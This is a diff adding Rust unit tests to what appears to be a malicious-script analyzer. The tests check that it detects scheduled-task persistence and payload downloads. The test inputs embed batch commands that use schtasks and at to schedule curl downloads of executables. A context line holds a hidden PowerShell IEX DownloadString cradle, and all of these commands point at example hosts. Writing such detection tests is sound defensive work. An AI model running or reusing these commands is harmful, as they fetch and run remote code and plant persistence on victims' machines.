@@ -1908,6 +1908,26 @@ schtasks /create /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks.example/
     }
 
     #[test]
+    fn schtasks_create_unquoted_tr_captures_full_child_command() {
+        let script = br#"@echo off
+schtasks /create /tn Updater /tr cmd.exe /c curl -o out.exe https://schtasks-unquoted.example/p.exe /sc once /st 00:00
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, command, .. }
+                    if hive == "ScheduledTask"
+                        && key == "Updater"
+                        && command == "cmd.exe /c curl -o out.exe https://schtasks-unquoted.example/p.exe"
+            )),
+            "unquoted /tr command was not captured fully: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn schtasks_create_tr_preserves_backslash_escaped_nested_quotes() {
         let script = br#"@echo off
 schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://task-quoted.example/p.ps1');\"" /sc minute /mo 60 /f
@@ -32744,6 +32764,23 @@ mod at_scheduler_tests {
                         && dst.as_deref() == Some("payload.exe")
             )),
             "at scheduled child command was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn at_scheduled_quoted_cmd_child_is_analyzed() {
+        let script = br#"at 23:59 "cmd.exe /V:ON /c set U=https://at-quoted.example/payload.exe&&curl -o payload.exe !U!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://at-quoted.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "quoted at scheduled child command was not analyzed: {:?}",
             report.traits
         );
     }
